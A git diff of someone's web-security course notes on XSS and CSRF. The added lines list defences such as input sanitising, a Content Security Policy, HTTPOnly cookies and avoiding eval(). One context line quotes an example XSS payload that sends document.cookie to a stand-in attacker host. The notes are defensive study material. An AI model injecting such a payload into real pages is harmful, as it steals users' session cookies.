@@ -881,4 +881,25 @@ hyosung11@HyoSungs-iMac projects %`
 - XSS running code across sites to different sites from my browser (as a bad actor)
 - e.g., `window.location = 'haxxed.com?cookie=' + document.cookie`
 
-- CSRF: link to malicious URL 
+- CSRF: link to malicious URL
+prevent using Content Security Policy: set by npm packages
+
+- Andrei demonstrates how to secure but does not recommend using cookies
+
+- Do client side user validation for quick user feedback; always validate and encode user input before using. Modern frameworks escape characters to avoid XSS by default.
+
+#### Main Points
+- sanitize input
+- do not use `eval()`
+- do not use `document.write()`
+- set Content Security Policy
+- set Secure & HTTPOnly Cookies
+
+#### Exercise Links
+- XSS https://www.hacksplaining.com/exercises/xss-stored
+- CSRF https://www.hacksplaining.com/exercises/csrf#/finish
+
+#### Resources
+- Content Security Policy https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
+- Cookies with HTTPOnly and Secure headers https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+- Cross-site scripting for dummies https://medium.com/hackernoon/cross-site-scripting-for-dummies-be30f76fad09
